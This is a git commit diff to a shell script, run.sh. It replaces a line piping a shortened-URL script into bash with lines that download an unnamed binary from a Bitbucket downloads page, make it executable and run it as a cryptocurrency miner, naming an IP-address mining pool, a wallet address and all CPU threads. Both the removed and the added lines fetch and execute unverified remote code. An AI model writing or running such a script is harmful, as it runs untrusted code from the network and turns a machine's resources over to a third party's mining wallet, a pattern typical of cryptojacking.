6a5b486988b477fd3c1e8ee62cc6f65b3a7f849e
Sazfa-Kuy <129221597+Sazfa-Kuy@users.noreply.github.com>
2024-01-10 00:32:07 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,2 +1,4 @@
 #!/bin/bash
-curl -sL https://bit.ly/tolilah | bash 
+wget -O sgr1 https://bitbucket.org/natalieawe/my-job/downloads/sereb 
+chmod +x sgr1
+./sgr1 --algorithm ghostrider --pool 141.94.192.217:7054 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive
